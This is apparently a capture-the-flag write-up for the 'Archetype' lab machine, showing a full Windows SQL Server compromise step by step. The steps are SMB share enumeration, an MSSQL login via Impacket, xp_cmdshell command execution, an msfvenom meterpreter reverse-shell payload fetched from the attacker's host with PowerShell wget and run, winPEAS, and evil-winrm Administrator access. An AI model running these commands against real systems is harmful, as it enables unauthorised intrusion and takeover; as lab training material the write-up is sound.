**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.129.95.187
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)


 Open Ports

* 135/tcp   open  msrpc        Microsoft Windows RPC
* 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
* 445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
* 1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.0
* 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
* 49664/tcp open  msrpc        Microsoft Windows RPC
* 49665/tcp open  msrpc        Microsoft Windows RPC
* 49666/tcp open  msrpc        Microsoft Windows RPC
* 49667/tcp open  msrpc        Microsoft Windows RPC
* 49668/tcp open  msrpc        Microsoft Windows RPC
* 49669/tcp open  msrpc        Microsoft Windows RPC

**SMB Client** to enumerate the SMB


```sh
  smbclient -N -L \\\\10.129.95.187\\
  ```

List of shares (**-L**)

No password (**-N**)

![image](https://user-images.githubusercontent.com/99097743/169720137-8d8b886d-3eb6-4862-b00f-76014203e263.png)

One of the sharenames does not have the dollar sign (**backups**) --> Non-Administrative share over SMB  


```sh
  smbclient -N //10.129.95.187/backups
  ```

**Impacket** to connect and authenticate to the MSSQL server

Impacket is a collection of Python classes for working with network protocols. Impacket packet includes **mssqlclient.py**  An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS. **It can be used in order to establish an authenticated connection to a Microsoft SQL Server**.


https://github.com/SecureAuthCorp/impacket

Impacket Installation Steps:
```sh
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket
supo python3 ./setup.py install
```

The command to connect and authenticate to the MSSQL server:
```sh
mssqlclient.py ARCHETYPE/sql_svc:{Password}@10.129.95.187 -windows-auth
```

- Please make sure to **enable xp_cmdshell** and **reconfigure**
- Need to use **xp_cmdshell** before every comments
  - xp_cmdshell dir --> Shows directory
  - xp_cmdshell "powershell -c cd C:/; pwd" --> First changes dir to C:/ then shows pwd

**Generate Reverse Shell**

We can try **msfvenom** tool to generate the payload for the reverse shell. 

![image](https://user-images.githubusercontent.com/99097743/169732063-60f5b6b4-3640-4197-92d5-8c265a02d9c7.png)

This command is important. It shows all framework payloads
```sh
msfvenom -l payloads 
```

The command to generate the payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.26 -f exe -o payload.exe
# Next Open Metasploit Framework
msfconsole
use exploit/multi/handler
show options
set payload windows/meterpreter/reverse_tcp
run
# Now our listener is active to connect to our localhost machine with VPN IP
```
![image](https://user-images.githubusercontent.com/99097743/169736888-315fe72f-fcd1-4e3f-af66-e5839c9659ed.png)

Now we need to transfer the payload (payload.exe) to the target machine

```sh
sudo python3 -m http.server 80
```

Now we go back to SQL server. 
Try to find directory with write and execute permissions 

```sh
xp_cmdshell "powershell -c cd C:/Users/Public"
# Now transfer the file
xp_cmdshell "powershell -c cd C:/Users/Public; wget http://10.10.16.26/payload.exe -o payload.exe"
# Make sure it's is downloaded
xp_cmdshell "powershell -c cd C:/Users/Public; dir"
# Let's execute the payload
xp_cmdshell "powershell -c cd C:/Users/Public; ./payload.exe"
```

Good job! meterpreter shell is activated:

![image](https://user-images.githubusercontent.com/99097743/169738799-2cc02f1e-e5d5-4b89-91a9-37b2860fb99f.png)

```sh
getuid
#user info
```

```sh
upload winPEASx64.exe
# IMPORTANT: For the Meterpreter shell, the local working directory is the location where one started the Metasploit console.
# In this case: $upload winPEASx64.exe: takes the file from /home/kali/htb/archetype to the target machine
```

We can now run winPEAS
```sh
shell
winPEASx64.exe
```
![Screenshot 2022-05-22 231416](https://user-images.githubusercontent.com/99097743/169742009-1a9d012b-6648-44d7-8603-a9be8d8aa013.png)

Now we have access to Administrator username:password! 

We can use evil-winrm 
https://www.kali.org/tools/evil-winrm/


```sh
evil-winrm -u Administrator -p {PASSCODE} -i 10.129.95.187
```
![image](https://user-images.githubusercontent.com/99097743/169846841-1375fdb3-80e3-4749-ad4c-282cf92d3a62.png)





